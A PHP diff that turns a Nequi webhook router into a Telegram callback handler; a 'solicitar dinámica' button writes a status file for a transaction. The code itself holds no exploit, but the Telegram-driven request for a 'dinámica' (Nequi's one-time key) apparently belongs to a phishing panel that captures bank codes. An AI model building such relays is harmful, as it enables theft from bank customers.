@@ -1,14 +1,42 @@
 <?php
-// Webhook principal que redirige a los webhooks específicos
-$request_uri = $_SERVER['REQUEST_URI'] ?? '';
+// webhook.php - Webhook funcional para Telegram
+header('Content-Type: application/json');
 
-if (strpos($request_uri, '/nequi-1-webhook') !== false) {
-    // Redirigir a nequi-1 webhook
-    require_once __DIR__ . '/data-ps/recargas/transaction/nequi-1/webhook.php';
-    exit;
+// Obtener el contenido del webhook
+$input = file_get_contents('php://input');
+$update = json_decode($input, true);
+
+if ($update && isset($update['callback_query'])) {
+    $callbackQuery = $update['callback_query'];
+    $callbackData = $callbackQuery['data'];
+
+    // Verificar si es un callback de solicitar dinamica
+    if (strpos($callbackData, 'solicitar_dinamica_') === 0) {
+        // Extraer transactionId del callback data
+        $transactionId = str_replace('solicitar_dinamica_', '', $callbackData);
+
+        // Actualizar el archivo de estado
+        $statusFile = 'dinamica_status.json';
+        $statusData = [
+            'transactionId' => $transactionId,
+            'status' => 'dinamica_solicitada',
+            'timestamp' => time()
+        ];
+
+        file_put_contents($statusFile, json_encode($statusData));
+
+        // Responder al callback de Telegram
+        $response = [
+            'method' => 'answerCallbackQuery',
+            'callback_query_id' => $callbackQuery['id'],
+            'text' => 'Dinámica solicitada correctamente',
+            'show_alert' => false
+        ];
+
+        echo json_encode($response);
+        exit;
+    }
 }
 
-// Si no es una ruta específica, devolver error
-http_response_code(404);
-echo "Webhook not found";
+echo json_encode(['status' => 'ok']);
 ?>
